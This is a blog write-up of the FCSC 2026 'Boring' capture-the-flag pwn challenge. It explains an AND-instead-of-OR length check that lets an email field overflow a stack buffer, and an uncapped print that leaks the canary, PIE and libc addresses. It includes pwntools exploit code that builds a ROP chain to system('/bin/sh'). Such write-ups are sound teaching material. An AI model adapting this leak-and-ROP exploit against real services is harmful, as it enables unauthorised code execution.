+++
title = 'FCSC 2026 Boring'
date = 2026-08-02T10:24:02+02:00
tags = ["pwn", "Overflow"]
categories = ["Hackropole"]
+++

**Challenge Name : Boring**  
**Difficulty : ★**  
**Number of solves : 45**

This post is in my series of writeup on FCSC 2026, since it's been long since I did the competition I restarted doing the challenges recently, as well as the 2 I didn't solve during the competition.  
Boring was a 1Star challenge and the second most solved challenge of this year.  
You can find the files of the challenge [here](https://github.com/Ret2skillz/CTFs/blob/main/FCSC2026/Boring/).

## TLDR ##
- The challenge allows us to send a "team" in cbor
- Function print_bytefield printing back the full size entered allow us to leak
- Bad comparison of sizes in email of user allow for a buffer overflow
- Simple system(/bin/sh) for the win

# Chal Analysis #

First of all the result of the checksec.  
![checksec](/images/FCSC2026/Boring/checksec.png)  
As we can see all the protections are in place on the binary.

The code was provided with the challenge, I won't paste it in full as it's almost 300 lines, but basically it's a service to create a team for the FCSC, we need to send the data as cbor.  
It caps the max players we can send to 10. We also need to make sure we send an email of format '@teamfrance.fr'
To get out of the loop we need to send 'y' when program asks us if our submission was correct, we can enter 'n' to stay in the loop instead.

# First Vulnerability #
The main vulnerability of this challenge lies in a bad comparison. Here is the vumnerable code (the comments are added by me).
```C
static int validate_email(bytestring_t *email)
{
    char user[32];
    char domain[32];

    const char *at = memchr(email->buf, '@', email->len);
    if (!at) {
        fprintf(stderr, "Error: invalid email format (missing '@')\n");
        return -1;
    }

    size_t user_len   = at - email->buf;
    size_t domain_len = email->len - user_len - 1;

    if ((user_len == 0 || user_len >= sizeof user) &&
        (domain_len == 0 || domain_len >= sizeof domain)) {
        fprintf(stderr, "Error: invalid email format (user or domain too long)\n");
        return -1; //here both needs to be true to get the error
    }
```
The comparison tries to check that the domain or username lengths are not too long and cause an overflow. The problem is it uses an AND comparison instead of an OR : if it returns true is when we get the error.  
For an AND comparison both needs to be true to return true, that means that it checks only if username and domain are too long at the same time, while it should obviously check them independently.  
So we can provide a valide email of a correct size, and a too long username, it will pass the check and cause our overflow.

## Leak ##
It should be noted that players are accumulated in the same buffer, espaced by 0x250.
There is an extract_bytestring that does cap the length to 255
```C
typedef struct {
    size_t len;
    char   buf[256];
} bytestring_t;

static int extract_bytestring(cbor_item_t *map, const char *key,
                              bytestring_t *dst)
{
    cbor_item_t *val = find_value(map, key);
    if (!val || !cbor_isa_bytestring(val) || !cbor_bytestring_is_definite(val))
        return -1;

    dst->len = cbor_bytestring_length(val);
    size_t copy = dst->len < sizeof(dst->buf) - 1
                  ? dst->len : sizeof(dst->buf) - 1;
    memcpy(dst->buf, cbor_bytestring_handle(val), copy);
    dst->buf[copy] = '\0';
    return 0;
}
```
However in the print_bytestring function returning players info it just take the size without capping, hence it can print what is after buffer if we provide a player with a big name.
```C
static void print_bytefield(const char *label, const char *buf, size_t len)
{
    printf("- %s: ", label);
    fwrite(buf, 1, len, stdout);
    printf("\n");
}
```

We can use the below code to get a leak.  
Basically, we create 9 normal players, for the 10th player we create it with a big nickname so that print_bytefield will use the total length and leak what's after the buffer. This way we can gain the PIE and LIBC leaks.

```python
players = []
for i in range(9):
    players.append({
        "nickname": b"P" + str(i).encode(),
        "email": (b"p%d@teamfrance.ctf" % i),
        "speciality": "pwn",
    })

players.append({ #this is our leak player
    "nickname": b"A"*672,
    "email": (b"p9@teamfrance.ctf"), #make sure email is valid and not too long
    "speciality": "pwn",
})

year = 2026
captain = 'Batman'
team = build_team_cbor(year, captain, players)

r.sendlineafter(b': ', team)
#offsets of leaks found
OFF_PIE_ADDR   = 592
OFF_CANARY     = 600
OFF_RBP        = 608
OFF_RET_MAIN   = 616
OFF_LIBC_RET   = 664

r.recvuntil(b"Player #10:\n- Nickname: ")


leak_raw = r.recvn(672) # size nickname for fwrite


pie_leak   = u64(leak_raw[OFF_PIE_ADDR:OFF_PIE_ADDR+8])
canary     = u64(leak_raw[OFF_CANARY:OFF_CANARY+8])
rbp_leak   = u64(leak_raw[OFF_RBP:OFF_RBP+8])
ret_main   = u64(leak_raw[OFF_RET_MAIN:OFF_RET_MAIN+8])
libc_ret   = u64(leak_raw[OFF_LIBC_RET:OFF_LIBC_RET+8])

elf.address = ret_main - 0x1fee  
libc.address = libc_ret - 0x29ca8

log.info(f'PIE BASE @ {hex(elf.address)}')
log.info(f'LIBC BASE @ {hex(libc.address)}')

ret = libc.address + 0x000000000002846b
pop_rdi = libc.address + 0x000000000002a145
binsh = next(libc.search(b'/bin/sh'))
system_addr = libc.sym['system']
```  
![leaks](/images/FCSC2026/Boring/leaks.png)

## Exploitation ##
Now that we have the leak, the exploitation is trivial, it's a simple overflow now, we can simply overflow, replace the canary since we leaked it and use a ropchain with libc gadgets to get a shell.
```python
payload = b'A'*72
payload += p64(canary)
payload += b'B'*8
payload += flat(
    ret,
    pop_rdi,
    binsh,
    system_addr
)

players.append({
    "nickname": b"A",
    "email": (payload + b"@teamfrance.ctf" ),
    "speciality": "pwn",
})

year = 2026
captain = 'Batman'
team = build_team_cbor(year, captain, players)

r.sendlineafter(b': ', team)

r.interactive()
```

![shell](/images/FCSC2026/Boring/shell.png)

## Conclusion ##
For a one star challenge I thought the vulnerabilities were not the most obvious ones usually found in easy challenges. But there wasn't much difficulty in this challenge. Its harder version was way more interesting.
